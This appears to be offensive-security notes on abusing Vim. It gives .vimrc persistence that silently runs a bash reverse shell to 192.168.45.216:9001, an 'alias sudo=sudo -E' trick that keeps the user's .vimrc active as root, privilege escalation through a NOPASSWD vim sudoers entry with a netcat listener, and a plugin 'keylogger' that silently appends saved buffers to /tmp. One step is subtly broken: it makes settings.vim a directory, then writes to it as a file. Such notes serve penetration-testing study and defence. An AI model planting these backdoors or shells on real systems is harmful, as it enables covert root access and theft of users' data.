# Executing commands under Vim
Within Vim, prepending ':!' allows for command execution when running Vim "Interactively"
```
:!echo "This is a command"
:!ping 127.0.0.1
```
Otherwise, .vimrc can be configured to execute commands when Vim is started.
```bash
echo '!ping 127.0.0.1' > ~/.vimrc
```

# VIM Backdoor

Vim can be used for persistence by appending silent startup commands to a `.vimrc` file, which gets executed every time a user opens Vim.


```bash
# Ensure .vimrc exists
touch ~/.vimrc

# We can then echo a silent command to run when Vim is started.
# The command below will execute the contents of .vimrunscript.
# source is a shell command that runs the content of the specified file.
echo ':silent !source /tmp/exploit' > ~/.vimrc


# Next, we set up `.vimrunscript`.
# Below is a simple example where a nc reverse shell is opened everytime Vim is opened.
cat << 'EOF' > /tmp/exploit
#!/bin/bash
sh -i >& /dev/tcp/192.168.45.216/9001 0>&1
EOF
```

# VIM and Sudo

## Ubuntu/Red Hat Systems:
On Ubuntu and Red Hat-based systems, when Vim is run with `sudo`, it still uses the **current user's .vimrc** file, even in the sudo context. This makes it easy to execute commands as root by modifying the user's `.vimrc`. This includes any scripts defined by `!source`, which will get executed in the context of `root`.

## Debian and Similar Systems:
On Debian-based systems, Vim run with `sudo` uses the **root user's .vimrc**. To achieve persistence in this context, you can add an alias to the user's `.bashrc` to preserve their environment when using `sudo`. This ensures the `.vimrc` is still used in the sudo context. In the below command, when `sudo` is called `sudo -E` will be executed instead.

```bash
echo 'alias sudo="sudo -E"' >> ~/.bashrc

# Optionally, enforce the alias change immediately
source ~/.bashrc
```
Sudo and Sudo -E has the following key differences:
- `sudo` Resets most environment variables for security and isolation.
- `sudo -E` Preserves the user's environment variables, allowing custom settings and configurations to be used in the command run as root.

This alias maintains control over the user's environment, allowing you to use `.vimrc` for backdoor-like functionality in future `sudo` sessions.

```
+-------------------------------------------------------------+
|   VIM configuration handling depends on Linux distribution: |
+-------------------------------------------------------------+
           |                                                |
           v                                                v
+-----------------------------------+        +-----------------------------------+
| Ubuntu, Red Hat (or similar):     |        | Debian (or similar):              |
| - Uses the user's .vimrc file     |        | - Uses the root's VIM config in   |
|   even in sudo context.           |        |   sudo context.                   |
+-----------------------------------+        +-----------------------------------+
           |                                                |
           v                                                v
+-----------------------------------+        +-----------------------------------+
| If VIM is run via sudo:           |        | Add alias to user's .bashrc to    |
| - Script in .vimrc will execute   |        | maintain control in future sudo   |
|   as root.                        |        | sessions.                         |
+-----------------------------------+        +-----------------------------------+
                                                            |
                                                            v
                                     +------------------------------------------+
                                     | echo 'alias sudo="sudo -E"' >> /home/    |
                                     | target_user/.bashrc to persist the       |
                                     | environment in future sudo sessions.     |
                                     +------------------------------------------+
```

# Vim Sudoers abuse
In some instances It may be found that users whom have an entry in the sudoers file can be exploited to gain a root shell through Vim.
In the output below, the user low-priv is able to execute the command `/usr/bin/vim /opt/important.conf` in the context of root without specifying a password

```
Matching Defaults entries for low-priv on victim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User low-priv may run the following commands on victim:
    (root) NOPASSWD: /usr/bin/vim /opt/important.conf
```
This means by running  `/usr/bin/vim /opt/important.conf` Vim is opened as root whereby it is possible to drop into the root shell by running `:shell` within Vim.

Putting it all together, it is possible to obtain a root shell by exploiting the above sudoers configuration. The example below is performed on ubuntu where .vimrc is executed within root context by default.
```bash
# Ensure that the user's .vimrc file exists
touch ~/.vimrc

# Add a silent command to execute the ~/exploit script every time Vim starts
echo ':silent !source ~/exploit' > ~/.vimrc

# Create the ~/exploit script with a reverse shell that connects to the attacker's machine
cat << 'EOF' > ~/exploit
#!/bin/bash
sh -i >& /dev/tcp/192.168.45.216/9001 0>&1
EOF

# On the attacker's system, set up a Netcat listener to catch the reverse shell
nc -lvp 9001

# Victim runs Vim with sudo privileges, triggering the reverse shell
sudo /usr/bin/vim /opt/important.conf
```

# Vim Keylogger
Useful for extracting potentially sensitive data. Can also be used in restricted environments where `:shell` is restricted within Vim.
This is run whenever Vim is started due to the presence a plugin file in `/.vim/plugin/*.vim`.

```bash
mkdir ~/.vim/plugin/settings.vim
```
```bash
# Only log under root user
cat << 'EOF' > ~/.vim/plugin/settings.vim
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/KeyLogger.log
:endif
EOF

# Log under anyone
cat << 'EOF' > ~/.vim/plugin/settings.vim
:autocmd BufWritePost * :silent :w! >> /tmp/KeyLogger.log
EOF
```
